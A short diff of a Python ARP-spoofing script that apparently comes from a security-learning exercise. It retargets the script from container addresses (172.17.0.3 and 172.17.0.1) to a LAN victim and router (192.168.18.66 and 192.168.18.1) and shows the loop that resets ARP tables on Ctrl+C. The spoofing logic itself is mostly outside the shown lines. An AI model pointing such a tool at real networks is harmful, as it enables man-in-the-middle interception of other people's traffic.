@@ -33,8 +33,8 @@ def restore(destination_ip, source_ip):
 
 
 #get_mac("172.17.0.3")
-target_ip = "172.17.0.3"
-router_ip = "172.17.0.1"
+target_ip = "192.168.18.66"
+router_ip = "192.168.18.1"
 try:
     sent_packets_count = 0
     while True:
@@ -50,4 +50,3 @@ except KeyboardInterrupt:
     restore(target_ip, router_ip)
     restore(router_ip, target_ip)
     print("\n[+] Detected Ctrl + C Resetting ARP tables... Please wait.\n")
-
